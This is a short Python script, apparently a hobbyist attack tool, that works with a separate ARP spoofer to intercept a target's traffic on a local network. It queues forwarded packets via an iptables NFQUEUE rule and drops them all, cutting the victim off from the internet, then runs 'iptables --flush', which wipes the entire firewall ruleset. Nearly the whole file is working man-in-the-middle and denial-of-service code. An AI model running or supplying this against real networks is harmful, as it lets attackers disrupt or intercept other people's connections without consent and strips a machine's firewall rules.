#this program requires you to run my arp_spoofer.py first

import subprocess
#pip install netfilterqueue
import netfilterqueue

def linux_commands_start():
	subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num0", shell=True)
	#to test on your own computer change the above command to "iptables -I OUTPUT -j NFQUEUE --queue-num0"
	#and "iptables -I INPUT -j NFQUEUE --queue-num0"

def linux_commands_end():
	subprocess.call("iptables --flush", shell=True)

def process_packet(packet):
	print(packet)
	packet.drop() #to cut the connection of the target from internet completely
	# can use packet.accept() to allows packet to reach destination even when it is being queued in our queue stack

linux_commands_start()

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

linux_commands_end()